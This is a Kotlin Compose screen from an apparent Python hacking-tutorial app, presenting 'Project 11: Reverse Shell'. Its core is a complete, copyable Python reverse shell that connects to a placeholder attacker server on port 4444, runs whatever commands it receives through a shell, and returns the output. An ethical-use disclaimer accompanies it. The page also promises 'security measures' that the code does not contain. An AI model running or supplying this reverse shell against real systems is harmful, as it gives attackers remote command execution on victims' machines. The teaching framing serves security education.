package com.example.hackwithpython.projects

import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.BasicText
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.ui.Modifier
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.example.hackwithpython.HackerWhite

@Composable
fun Project11Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 11: Reverse Shell",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                In this project, you will create a reverse shell using Python. 
                A reverse shell allows an attacker to gain remote access to a victim's machine, enabling command execution and control over the system. 
                This project will help you understand how reverse shells operate and the security implications associated with them.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before starting this project, ensure you have:
                - A basic understanding of networking and socket programming.
                - Familiarity with Python programming.
                - A controlled environment to test the reverse shell safely (such as a virtual machine).
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Description
        Text(
            text = "Project Description",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you will:
                - Create a reverse shell script that connects to a specified server.
                - Handle various commands sent from the server.
                - Implement security measures to ensure safe execution of commands.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code
        Text(
            text = "Python Code Example: Reverse Shell",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is an example of how to implement a simple reverse shell in Python:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        SelectionContainer {
        BasicText(
            text = """
                import socket
                import subprocess
                import os

                # Connect to the attacker's server
                server_ip = 'YOUR_SERVER_IP'  # Replace with your server IP
                server_port = 4444  # Port number for the connection

                s = socket.socket()
                s.connect((server_ip, server_port))

                while True:
                    # Receive command from the server
                    command = s.recv(1024).decode()

                    if command.lower() == 'exit':
                        break
                    
                    # Execute the command and send the results back
                    if command.startswith('cd'):
                        try:
                            os.chdir(command.strip('cd '))
                            s.send(b'Changed directory')
                        except FileNotFoundError as e:
                            s.send(str(e).encode())
                    else:
                        output = subprocess.run(command, shell=True, capture_output=True)
                        s.send(output.stdout + output.stderr)

                s.close()
            """.trimIndent(),
            style = TextStyle(
                fontFamily = FontFamily.Monospace,
                fontSize = 14.sp,
                color = HackerWhite
            ),
            modifier =Modifier.padding(12.dp)
                .horizontalScroll(rememberScrollState())
        )
            }
        // Ethical Use Disclaimer
        Text(
            text = "Ethical Use Disclaimer",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project is for educational purposes only. Never use a reverse shell on unauthorized systems, as this is illegal 
                and unethical. Always conduct your experiments in a controlled environment where you have explicit permission.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next project
        Button(onClick = { navController.navigate("project12") }) {
            Text(text = "Next Project")
        }
    }
}
